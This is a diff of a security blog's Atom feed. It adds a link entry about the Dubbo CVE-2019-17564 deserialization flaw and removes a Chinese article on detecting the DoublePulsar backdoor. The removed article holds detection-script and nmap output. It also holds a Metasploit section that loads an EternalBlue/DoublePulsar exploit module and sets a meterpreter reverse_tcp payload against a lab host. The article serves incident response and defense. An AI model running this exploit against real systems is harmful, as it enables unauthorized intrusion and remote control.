@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.mi1k7ea.com/"/>
-  <updated>2021-07-04T03:46:44.576Z</updated>
+  <updated>2021-07-10T16:04:58.489Z</updated>
   <id>https://www.mi1k7ea.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>浅析Dubbo HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）</title>
+    <link href="https://www.mi1k7ea.com/2021/07/11/%E6%B5%85%E6%9E%90Dubbo-HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/"/>
+    <id>https://www.mi1k7ea.com/2021/07/11/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/</id>
+    <published>2021-07-10T16:03:22.000Z</published>
+    <updated>2021-07-10T16:04:58.489Z</updated>
+    
+    <content type="html"><![CDATA[<p>发布于公众号98KSec：</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0MTIxNzAyNw==&amp;mid=2247483740&amp;idx=1&amp;sn=3679ae9216b2d52e0255683655c35dc9&amp;chksm=c2d48530f5a30c260a4ef6ef88f865609265b6b32a3e3d98018ec6c8d527bc33dd20c454a453&amp;token=1134526135&amp;lang=zh_CN#rd" target="_blank" rel="noopener">浅析Dubbo HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;发布于公众号98KSec：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzk0MTIxNzAyNw==&amp;amp;mid=2247483740&amp;amp;idx=1&amp;amp;sn=3679ae9216b2d52e02556
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>浅析Dubbo Kryo/FST反序列化漏洞（CVE-2021-25641）</title>
@@ -489,30 +511,6 @@
       <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
     
       <category term="DNSLog" scheme="https://www.mi1k7ea.com/tags/DNSLog/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>DoublePulsar后门检测</title>
-    <link href="https://www.mi1k7ea.com/2021/03/27/DoublePulsar%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B/"/>
-    <id>https://www.mi1k7ea.com/2021/03/27/DoublePulsar后门检测/</id>
-    <published>2021-03-27T08:00:32.000Z</published>
-    <updated>2021-03-27T08:51:01.947Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一般的，DoublePulsar后门会和Wannacry一块出没。而这就需要在做应急响应或者内网主机安全排查的时候来进行检测。</p><h2 id="0x01-DoublePulsar后门检测"><a href="#0x01-DoublePulsar后门检测" class="headerlink" title="0x01 DoublePulsar后门检测"></a>0x01 DoublePulsar后门检测</h2><h3 id="DoublePulsar简介"><a href="#DoublePulsar简介" class="headerlink" title="DoublePulsar简介"></a>DoublePulsar简介</h3><p>DoublePulsar是由美国国家安全局（NSA）方程式组开发的后门植入工具，于2017年初由影子经纪人（The Shadow Brokers）泄露。该工具仅在几周内感染了超过200,000台Microsoft Windows计算机，并在2017年5月的WannaCry勒索软件攻击中与EternalBlue一起使用。</p><p>DoublePulsar以内核模式运行， 属于Rootkit，这使网络犯罪分子能够对计算机系统进行高级别的控制。安装后，它使用三个命令：ping、kill和 exec、exec可用于将恶意软件加载到系统上。</p><p>具体漏洞分析参考：<a href="https://www.freebuf.com/news/138725.html" target="_blank" rel="noopener">https://www.freebuf.com/news/138725.html</a></p><h3 id="DoublePulsar后门检测方法"><a href="#DoublePulsar后门检测方法" class="headerlink" title="DoublePulsar后门检测方法"></a>DoublePulsar后门检测方法</h3><h4 id="GitHub检测脚本"><a href="#GitHub检测脚本" class="headerlink" title="GitHub检测脚本"></a>GitHub检测脚本</h4><p>项目地址：<a href="https://github.com/countercept/doublepulsar-detection-script" target="_blank" rel="noopener">https://github.com/countercept/doublepulsar-detection-script</a></p><p>以Python2运行，分为SMB和RDP两个脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python detect_doublepulsar_smb.py --ip 192.168.175.128</span></span><br><span class="line">[-] [192.168.175.128] No presence of DOUBLEPULSAR SMB implant</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python detect_doublepulsar_smb.py --ip 192.168.175.128</span></span><br><span class="line">[+] [192.168.175.128] DOUBLEPULSAR SMB IMPLANT DETECTED!!!</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1</span></span><br><span class="line">[*] [192.168.175.141] Sending negotiation request</span><br><span class="line">[*] [192.168.175.141] Server explicitly refused SSL, reconnecting</span><br><span class="line">[*] [192.168.175.141] Sending non-ssl negotiation request</span><br><span class="line">[*] [192.168.175.141] Sending ping packet</span><br><span class="line">[-] [192.168.175.141] No presence of DOUBLEPULSAR RDP implant</span><br><span class="line">[*] [192.168.175.143] Sending negotiation request</span><br><span class="line">[*] [192.168.175.143] Server chose to use SSL - negotiating SSL connection</span><br><span class="line">[*] [192.168.175.143] Sending SSL client data</span><br><span class="line">[*] [192.168.175.143] Sending ping packet</span><br><span class="line">[-] [192.168.175.143] No presence of DOUBLEPULSAR RDP implant</span><br><span class="line">[*] [192.168.175.142] Sending negotiation request</span><br><span class="line">[*] [192.168.175.142] Sending client data</span><br><span class="line">[*] [192.168.175.142] Sending ping packet</span><br><span class="line">[+] [192.168.175.142] DOUBLEPULSAR RDP IMPLANT DETECTED!!!</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python2 detect_doublepulsar_smb.py --ip 192.168.175.136 --uninstall</span></span><br><span class="line">[+] [192.168.175.136] DOUBLEPULSAR SMB IMPLANT DETECTED!!! XOR Key: 0x7c3bf3c1</span><br><span class="line">[+] [192.168.175.136] DOUBLEPULSAR uninstall successful</span><br></pre></td></tr></table></figure><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>参考：<a href="https://nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 445 &lt;target&gt; --script=smb-double-pulsar-backdoor</span><br></pre></td></tr></table></figure><p>扫描输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">| smb-double-pulsar-backdoor:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Double Pulsar SMB Backdoor</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)</span><br><span class="line">|       The Double Pulsar SMB backdoor was detected running on the remote machine.</span><br><span class="line">|</span><br><span class="line">|     Disclosure date: 2017-04-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://isc.sans.edu/forums/diary/Detecting+SMB+Covert+Channel+Double+Pulsar/22312/</span><br><span class="line">|       https://github.com/countercept/doublepulsar-detection-script</span><br><span class="line">|_      https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation</span><br></pre></td></tr></table></figure><h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载对应的MSF插件并复制到目标目录中</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git</span><br><span class="line"><span class="built_in">cd</span> Eternalblue-Doublepulsar-Metasploit/</span><br><span class="line">cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 --fix-missing</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建.wine/drive_c目录，否则后续利用漏洞时会出现目录不存在错误</span></span><br><span class="line">mkdir -p /root/.wine/drive_c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启MSF并重新加载插件</span></span><br><span class="line">msfconsole</span><br><span class="line">reload_all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞利用</span></span><br><span class="line">use exploit/windows/smb/eternalblue_doublepulsar</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.200.142</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.200.130</span><br><span class="line"><span class="built_in">set</span> PROCESSINJECT explorer.exe <span class="comment"># 注意，需要设置PROCESSINJECT，使用默认值并没成功，改PROCESSINJECT为explorer.exe成功</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>如果扫描出来，可以应用前面的检测脚本清理掉：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 detect_doublepulsar_smb.py --ip 192.168.175.136 --uninstall</span><br></pre></td></tr></table></figure><p>然后，安装补丁。</p>]]></content>
-    
-    <summary type="html">
-    
-      已完结.
-    
-    </summary>
-    
-      <category term="Windows" scheme="https://www.mi1k7ea.com/categories/Windows/"/>
-    
-    
-      <category term="Windows" scheme="https://www.mi1k7ea.com/tags/Windows/"/>
-    
-      <category term="DoublePulsar" scheme="https://www.mi1k7ea.com/tags/DoublePulsar/"/>
     
   </entry>
   
